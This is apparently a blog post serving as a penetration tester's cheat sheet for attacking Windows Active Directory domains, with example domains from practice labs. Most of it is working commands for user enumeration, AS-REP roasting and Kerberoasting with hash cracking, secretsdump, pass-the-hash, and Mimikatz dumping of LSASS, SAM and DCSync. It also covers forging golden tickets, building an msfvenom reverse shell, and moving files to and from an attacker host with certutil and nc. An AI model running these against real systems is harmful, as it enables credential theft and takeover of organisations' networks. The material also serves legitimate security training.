## Remote AD Enumeration/Attacks
This section is my bread and butter. 90% of the stuff I do/use comes from this section. It all boils to enumeration: use enum4linux/ldapsearch to initially see if you can find users/info, then put those users into a list and/or use kerbrute/impacket-lookupsid to find more/verify the found users, then just run through the rest of the commands and hope to get a hash back, crack it, then move onto the password-required tools, then re-run through all the tools as the new user/password. Pretty cut and dry.
**Enumerate port 139/445 with enum4linux:**
```
enum4linux -v $DOMAIN_CONTROLLER_IP
```
**Enumerate LDAP w/ ldapsearch:**
```
ldapsearch -x -h $DOMAIN_CONTROLLER_IP -s base namingcontexts
```
Parse through the returned naming contexts, then enumerate each one:
```
ldapsearch -x -h $DOMAIN_CONTROLLER_IP -b ‘DC=EGOTISTICAL-BANK,DC=LOCAL’
```
You can further query specific sections of each naming context:
```
ldapsearch -h $DOMAIN_CONTROLLER_IP -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
```
Search through the output and see if you can identify interesting parameters. You may be able to create a user list based on the output. You might get lucky and find some sensitive info like passwords. Try piping the command grep and grepping for pass, pwd, password, domain, user, etc..
**Enumerate users via Kerbrute:**
-   [add domain name to / etc / hosts file]
```
./kerbrute userenum — dc $DOMAIN_CONTROLLER_IP -d <domain.local> <user list>
```
You can also enumerate users with netexec’s — users option if you have creds.
If kerbrute doesn’t work, try impacket-lookupsid
```
impacket-lookupsid <domain.local>@$DOMAIN_CONTROLLER_IP
```
If you manual enumeration doesn’t get you a valid list of users try:
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
**AS-REPRoasting:**
```
impacket-GetNPUsers <domain.local>/ -no-pass -usersfile <path to users list> -format hashcat
```
[this command can also be used if you find valid creds, might get different results with creds]
-   [paste hash into a file — users.txt]
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
GetNPUsers.py [impacket-GetNPUsers]
**Dump password hashes a specific service account has access to (usually requires creds):**
```
impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip $DOMAIN_CONTROLLER_IP
```
**Use Evil-WinRM or win-pth to connect to host using PTH attack:**
```
evil-winrm -i $DOMAIN_CONTROLLER_IP -u <user> -H <hash>
```
When using win-pth you have to append the blank LM hash to the beginning of the user’s hash, I’ll provide a link explaining this.
-   Blank LM hash (always the same) — Aad3b435b51404eeaad3b435b51404ee
```
pth-winexe -U <domain>/<user>%<LM hash>:<user hash> //$DOMAIN_CONTROLLER_IP <command to run>
```
Example win-pth command:
* Blank 1st part of hash.
```
pth-winexe -U svcorp/pete%aad3b435b51404eeaad3b435b51404ee:0f951bc4fdc5dfcd148161420b9c6207 //$DOMAIN_CONTROLLER_IP cmd.exe
```

**Get User SPNs:**
```
impacket-GetUserSPNs <IP or hostname>/<username>:<password>
```
[add -request if SPN is found]
-   [save hash and crack with hashcat]
```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
**Decrypt Groups.xml cpassword:**
If you find a file on a Windows box named Groups.xml, this is a Group Policy Preferences XML (GPP) file. gpp-decrypt will extract usernames and passwords from it and decrypt it.
```
python3 gpp-decrypt.py -f <groups.xml file>
```
or
```
python3 gpp-decrypt.py -c <cpassword>
```

## Bloodhound
One of the best tools for AD enumeration. Use it in conjunction with SharpHound.exe on target to grab a visual representation of the domain. Also has some useful pre-built queries to identify the best path to Domain Admin, who is kerberoastable, etc.
**SharpHound Tutorial:**
[https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
**SharpHound (exe or ps1) downloads:**
[https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
**Bloodhound Cheatsheet:**
- In Kali: neo4j console [to start backend service]
- Enter creds [from initial setup]
- Transfer SharpHound (exe or ps1) and nc.exe to target
- Run SharpHound.exe or .ps1
- Transfer loot back to kali:
— On $LHOST:
```
nc -nlvp 4321 > loot.zip
```
— On target:
```
nc.exe -nv $KALI 4321 < loot.zip
```
- Drag loot.zip into BloodHound GUI
## Mimikatz.exe
Mimikatz.exe is a tool that allows you to extract passwords stored in memory and perform some AD attacks (PTT, etc). Obviously at least need a low-priv user, but it usually only works as an Administrator or SYSTEM. Just transfer it to target and run the binary.
[https://www.liquidweb.com/kb/how-to-install-and-use-mimikatz/](https://www.liquidweb.com/kb/how-to-install-and-use-mimikatz/)
[https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
Sometimes older systems require an older version of Mimikatz.exe, version 2.1.1:
[https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/)
**Always start Mimikatz.exe session by entering:
```
privilege::debug
```
```
token::elevate
```
When I run mimikatz I usually try to run most of the below commands, or at least will dump LSASS, dump SAM, and dump secrets.
**Mimikatz.exe Cheat Sheet:**
Dump LSASS:
```
mimikatz privilege::debug
```
```
mimikatz token::elevate
```
```
mimikatz sekurlsa::logonpasswords
```
**#(Over) Pass The Hash
```
privilege::debug
```
```
sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
```
**#List all available kerberos tickets in memory
```
sekurlsa::tickets
```
**#Dump local Terminal Services credentials
```
sekurlsa::tspkg
```
**#Dump and save LSASS in a file
```
sekurlsa::minidump c:\temp\lsass.dmp
```
**#List cached MasterKeys
```
sekurlsa::dpapi
```
**#List local Kerberos AES Keys
```
sekurlsa::ekeys
```
**#Dump SAM Database
```
lsadump::sam
```
**#Dump SECRETS Database
```
lsadump::secrets
```
**#Inject and dump the Domain Controller’s Credentials
```
mimikatz privilege::debug
```
```
mimikatz token::elevate
```
```
lsadump::lsa /inject
```
**#Dump the Domain’s Credentials without touching DC’s LSASS and also remotely
```
lsadump::dcsync /domain:<DomainFQDN> /all
```
**#List and Dump local kerberos credentials
```
kerberos::list /dump
```
**#Pass The Ticket
```
kerberos::ptt <PathToKirbiFile>
```
**#List TS/RDP sessions
```
ts::sessions
```
**#List Vault credentials
```
vault::list
```
**Kerberoasting:**
[https://stealthbits.com/blog/extracting-service-account-passwords-with-kerberoasting/](https://stealthbits.com/blog/extracting-service-account-passwords-with-kerberoasting/)
[https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8](https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8)
**Pass-The-Ticket (PTT):**
PTT works by dumping the TGT from the LSASS memory of the machine. LSASS is a memory process that stores credentials on an active directory server and can store Kerberos tickets along with other credential types. When you dump the ticket with Mimikatz it will give you a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in LSASS memory. Great attack for privilege escalation and lateral movement.
```
mimikatz.exe
```
```
privilege::debug
```
```
sekurlsa::tickets /export
```
- (this will export all of the .kirbi tickets into your present working directory)
**Always look for an administrator@krbtgt ticket if possible.**
Now to pass the ticket:
```
kerberos::ptt <.kirbi ticket>
```
- klist [not in mimikatz session — verifies your ticket was injected]
**Golden Ticket Attack:**
This attack works by dumping the TGT of any user on the domain, this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket you would dump any service or domain ticket.
```
mimikatz.exe
```
```
privilege::debug
```
```
lsadump::lsa /inject /name:krbtgt (to create a silver ticket change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account)
```
```
kerberos::golden /user:administrator /domain:<domain.local> /sid:<krbtgt’s full SID> /krbtgt:<NTLM Hash of krbtgt> /id:500 [to create a silver ticket user a different service account — place the NTLM, SID, and id 1103 into the proper slots of this command]
```
To access other machines with the Golden/Silver ticket:
```
misc::cmd [to spawn cmd.exe instance for your new ticket]
```
```
dir \\<other machine name or IP>\C$
```
## MSFVenom Reverse Shell (.exe)
Nothing special to this. I just liked having it handy.
```
msfvenom -a x64 — platform Windows -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o reverse.exe
```
If this one doesn’t work try:
```
windows/x64/shell/reverse_tcp
```
as the payload instead. Or **take out x64 if it’s a 32-bit box.**
## File Transfer (From Target)
On localhost, start webserver from location in which the file you want to transfer is in:
```
python3 -m http.server 80
```
On target, enter this command:
```
certutil.exe -urlcache -split -f http://$KALI:80/reverse.exe
```
## Start PowerShell Session And Import Module
```
powershell.exe -nop -exec bypass
```
```
Import-Module <Full Path to xyz.ps1>
```
## Connect To Host w/ Found/Cracked Creds
```
python3 /opt/impacket/examples/psexec.py <domain>/<username>:<password>@$TARGET
```
**or**
```
impacket-psexec.py <domain>/<username>:<password>@$TARGET
```
**OR**
If you have creds/hashes to the target, use netexec to request the reverse shell, and again to execute it.
For the first command, change the ‘rev.exe’ section in the picture below to:
```
certutil.exe -urlcache -split -f http://$KALI:80/reverse.exe
```
then run your modified version of the command below (make sure you were hosting a web server for rev.exe, and make sure you have an nc listener for the shell):

## kerbrute
Kerbrute is a popular enumeration tool used to brute force and enumerate valid active directory users by abusing Kerberos pre-authentication. I like to start username enumeration with the below wordlist, but hopefully I can grab legit usernames through LDAP enumeration or enum4linux. If so, I’ll create a user list based on those names and use kerbrute to verify they actually exist.
**kerbrute binary:**
[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
**Wordlist:**
[https://github.com/jeanphorn/wordlist/blob/master/usernames.txt](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt)
-   Add DC (or hostname) DNS name and IP to / etc / hosts file (Medium doesn’t allow me to type the filename without the spaces)
```
./kerbrute userenum — dc <hostname.local> -d <domain name> <path to user-wordlist>
```
## Rubeus
Good tool for harvesting TGTs and conducting various attacks. Transfer it to the target to run it.
**rubeus binary:**
[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
**Harvest TGTs every 30 seconds:**
```
rubeus.exe harvest /interval:30
```
**Kerberoasting:**
```
rubeus.exe kerberoast
```
-   [copy the hash to your attack box into a file — we’ll call it hash.txt]
```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**AS-REP Roasting:**
Similar to kerberoasting, AS-REP roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike kerberoasting, these users do not have to be service accounts; the only requirement to be able to AS-REP roast a user is that the user must have pre-authentication disabled.
```
rubeus.exe asreproast /format:hashcat /outfile:<filename of choice>
```
-   [save hash to file on attack box — we’ll call it hash.txt]
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
## Conclusion
That’s it! AD exploitation is pretty simple once you get the hang of it. Having a cheat sheet makes life much easier. When you’re in a time crunch or are feeling brain dead this will make your life so much easier. Feel free to take this and do whatever you want. Add to it, take away from it, reformat it, I don’t care. Hope it helps!
